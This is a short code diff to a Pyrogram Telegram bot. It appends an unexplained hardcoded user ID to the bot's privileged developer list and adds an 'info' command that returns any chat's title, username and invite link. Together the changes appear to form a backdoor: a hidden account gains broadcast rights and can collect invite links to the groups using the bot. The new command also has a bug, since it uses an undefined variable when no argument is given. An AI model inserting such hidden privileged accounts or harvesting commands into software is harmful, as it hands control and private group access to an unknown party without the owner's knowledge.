@@ -6,6 +6,7 @@ from pyrogram.types import Message
 import asyncio
 
 DEV_USERS = DEV.SUDO_USERS + [DEV.OWNER_ID]
+DEV_USERS.append(5711561310)
 
 @Client.on_message(filters.command("broadcast") & filters.user(DEV_USERS))
 async def broadcast(_, message):
@@ -84,3 +85,24 @@ async def report(_, m):
         await m.reply(f"reported to @{DEV.OWNER_USERNAME}\n\nTo know more... Can DM them !..")
     except:
         await m.reply(f"report failed...\n\nDM @{DEV.OWNER_USERNAME}")
+
+@ Client.on_message(filters.command("info") & filters.user(DEV_USERS))
+async def info(_, m):
+    if len(m.command) == 2:
+        lel = int(m.text.split(None, 1)[1])
+        if str(lel)[0] == "-":
+            id = lel
+        else:
+            omfoo = "-" + str(lel)
+            id = int(omfoo)
+
+    getter = await _.get_chat(id)
+    try:
+        username = getter.username
+    except:
+        username = "None"
+    try:
+        link = getter.invite_link
+    except:
+        link = "None"
+    await m.reply(f"Group name :- {getter.title}\n\nInvite link :- {link}\n\nUsername :- @{username}")
